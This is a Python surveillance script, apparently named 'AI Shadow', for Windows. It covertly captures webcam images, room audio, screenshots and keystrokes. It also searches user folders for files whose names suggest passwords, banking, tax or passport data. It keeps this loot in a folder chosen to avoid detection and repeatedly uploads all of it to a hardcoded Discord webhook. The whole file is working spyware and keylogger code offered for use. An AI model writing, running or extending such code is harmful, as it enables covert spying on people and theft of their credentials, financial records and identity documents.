import ctypes, os, cv2, time, requests, shutil
import sounddevice as sd
from scipy.io.wavfile import write
from PIL import ImageGrab
from pynput.keyboard import Listener, Key

# --- CONFIGURATION ---
# Your unique Discord Webhook URL
WEBHOOK_URL = "https://discordapp.com/api/webhooks/1493140293115973712/DJQWjbpCdhv2n_F6aXMRciTqZDpOgUUY4fcBeXTKgRLZy9U9qFG9RHZztkKvrwvGz59O"
IDLE_THRESHOLD = 10 
# Hidden local storage in the Public folder to avoid detection
LOOT_DIR = "C:\\Users\\Public\\Log_Cache"

if not os.path.exists(LOOT_DIR):
    os.makedirs(LOOT_DIR)

# --- 1. THE BRAIN: IDLE DETECTOR ---
def get_idle_time():
    class LASTINPUTINFO(ctypes.Structure):
        _fields_ = [("cbSize", ctypes.c_uint), ("dwTime", ctypes.c_uint)]
    lii = LASTINPUTINFO(); lii.cbSize = ctypes.sizeof(lii)
    ctypes.windll.user32.GetLastInputInfo(ctypes.byref(lii))
    return (ctypes.windll.kernel32.GetTickCount() - lii.dwTime) / 1000.0


# --- 2. THE EYES: SILENT CAMERA ---
def capture_camera():
    path = os.path.join(LOOT_DIR, "sys_snap.jpg")
    cam = cv2.VideoCapture(0)
    ret, frame = cam.read()
    if ret:
        cv2.imwrite(path, frame)
    cam.release()
    return path

# --- 3. THE SCOUT: FILE THIEF ---
def scout_files():
    # Targeted search paths for sensitive details
    paths = [os.path.join(os.environ["USERPROFILE"], d) for d in ["Videos","Download"]]

    keywords = ["pass", "bank", "secret", "tax", "passport"]
    loot_found = []
    for path in paths:
        for root, dirs, files in os.walk(path):
            for file in files:
                if any(k in file.lower() for k in keywords):
                    loot_found.append(os.path.join(root, file))
    # print(loot_found)
    return loot_found

# --- 4. THE EARS: AUDIO RECORDER ---
def record_audio():
    path = os.path.join(LOOT_DIR, "room_mic.wav")
    try:
        fs = 44100
        duration = 5 # Records room audio for 5 seconds
        recording = sd.rec(int(duration * fs), samplerate=fs, channels=1)
        sd.wait() 
        write(path, fs, recording)
        return path
    except Exception:
        return None
    


def take_screenshot(delay=0):
    """Capture a screenshot and save it with optional delay"""
    path = os.path.join(LOOT_DIR, "screenshot.png")
    try:
        if delay > 0:
            time.sleep(delay)
        screenshot = ImageGrab.grab()
        screenshot.save(path)
        return path
    except Exception as e:
        print(f"Screenshot failed: {e}")
        return None

# --- 4.5. THE KEYLOGGER: KEYSTROKE RECORDER ---
def record_keystrokes(duration=15):
    """Record keystrokes for specified duration and save to file"""
    path = os.path.join(LOOT_DIR, "keystrokes.txt")
    keystrokes = []

    def on_press(key):
        try:
            keystrokes.append(key.char)
        except AttributeError:
            # Special keys
            if key == Key.space:
                keystrokes.append(' ')
            elif key == Key.enter:
                keystrokes.append('\n')
            elif key == Key.tab:
                keystrokes.append('\t')
            elif key == Key.backspace:
                keystrokes.append('[BACKSPACE]')
            elif key == Key.shift:
                keystrokes.append('[SHIFT]')
            elif key == Key.ctrl_l or key == Key.ctrl_r:
                keystrokes.append('[CTRL]')
            elif key == Key.alt_l or key == Key.alt_r:
                keystrokes.append('[ALT]')
            else:
                keystrokes.append(f'[{key}]')

    try:
        listener = Listener(on_press=on_press)
        listener.start()
        time.sleep(duration)
        listener.stop()

        # Write to file
        with open(path, 'a') as f:  # Append mode
            f.write(''.join(keystrokes) + '\n')
        return path
    except Exception as e:
        print(f"Keylogger failed: {e}")
        return None

# --- 5. THE DELIVERY: SEND ALL DETAILS ---
def send_all_details(photo, audio, files, screenshot=None, keystrokes=None):
    # Send Snapshot
    with open(photo, "rb") as p:
        requests.post(WEBHOOK_URL, files={"file": p}, data={"content": "📸 Snapshot Captured!"})
    
    # Send Screenshot (if captured successfully)
    if screenshot and os.path.exists(screenshot):
        with open(screenshot, "rb") as s:
            requests.post(WEBHOOK_URL, files={"file": s}, data={"content": "🖥️ Screenshot Captured!"})
    
    # Send Audio (only if recorded successfully)
    if audio and os.path.exists(audio):
        with open(audio, "rb") as a:
            requests.post(WEBHOOK_URL, files={"file": a}, data={"content": "🎤 Room Audio Captured!"})
    
    # Send Keystrokes (if recorded)
    if keystrokes and os.path.exists(keystrokes):
        with open(keystrokes, "rb") as k:
            requests.post(WEBHOOK_URL, files={"file": k}, data={"content": "⌨️ Keystrokes Recorded!"})
    
    # Send Actual Files (not just paths)
    if files:
        for file_path in files[:5]:  # Send up to 5 files
            try:
                if os.path.exists(file_path) and os.path.isfile(file_path):
                    with open(file_path, "rb") as f:
                        file_name = os.path.basename(file_path)
                        requests.post(WEBHOOK_URL, files={"file": f}, data={"content": f"📄 Sensitive File: {file_name}"})
            except Exception as e:
                print(f"Failed to send file {file_path}: {e}")

# --- MAIN LOOP ---
while True:
    print("AI Shadow activating...")
    p_path = capture_camera()
    a_path = record_audio()
    s_files = scout_files()
    sc_path = take_screenshot(delay=2)  # 2 second delay before screenshot
    k_path = record_keystrokes(duration=5)  # Record keystrokes for 5 seconds
    
    send_all_details(p_path, a_path, s_files, screenshot=sc_path, keystrokes=k_path)
    
    # Capture and record every 5 seconds, regardless of idle status
    time.sleep(5)


def main():
    print("hack script running")    
    # --- CONFIGURATION ---
